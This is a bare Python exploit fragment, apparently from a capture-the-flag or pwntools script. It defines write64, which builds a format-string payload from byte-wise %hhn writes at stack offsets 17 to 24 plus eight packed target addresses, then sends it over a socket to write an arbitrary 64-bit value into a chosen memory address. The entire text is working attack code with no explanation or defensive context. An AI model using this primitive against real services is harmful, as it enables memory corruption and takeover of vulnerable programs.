def write64(addr, data):
    p = "%{}c".format( data & 0xFF )
    p += "%17$hhn"
    p += "%{}c".format( 0x100 - ((data) & 0xFF) + ((data >> 8) & 0xFF ))
    p += "%18$hhn"
    p += "%{}c".format( 0x100 - ((data >> 8) & 0xFF) + ((data >> 16) & 0xFF ))
    p += "%19$hhn"
    p += "%{}c".format( 0x100 - ((data >> 16) & 0xFF) + ((data >> 24) & 0xFF ))
    p += "%20$hhn"
    p += "%{}c".format( 0x100 - ((data >> 24) & 0xFF) + ((data >> 32) & 0xFF ))
    p += "%21$hhn"
    p += "%{}c".format( 0x100 - ((data >> 32) & 0xFF) + ((data >> 40) & 0xFF ))
    p += "%22$hhn"
    p += "%{}c".format( 0x100 - ((data >> 40) & 0xFF) + ((data >> 48) & 0xFF ))
    p += "%23$hhn"
    p += "%{}c".format( 0x100 - ((data >> 48) & 0xFF) + ((data >> 56) & 0xFF ))
    p += "%24$hhn"
    p = p.ljust(0x60,"\x00")
    p += p64(addr)
    p += p64(addr+1)
    p += p64(addr+2)
    p += p64(addr+3)
    p += p64(addr+4)
    p += p64(addr+5)
    p += p64(addr+6)
    p += p64(addr+7)
    s.sendline(p)
